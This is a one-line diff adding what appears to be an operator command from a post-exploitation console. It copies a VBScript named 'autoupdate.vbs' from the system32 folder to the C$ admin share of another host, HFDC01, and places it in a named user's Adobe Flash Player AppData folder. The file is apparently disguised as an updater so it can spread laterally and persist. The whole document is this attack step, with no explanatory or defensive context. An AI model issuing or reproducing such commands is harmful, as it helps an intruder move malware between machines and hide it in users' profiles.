@@ -1,0 +1,1 @@
+shell COPY c:\windows\system32\autoupdate.vbs "`\`\HFDC01\C$\Users\pgustavo\AppData\Roaming\Adobe\Flash Player\autoupdate.vbs"
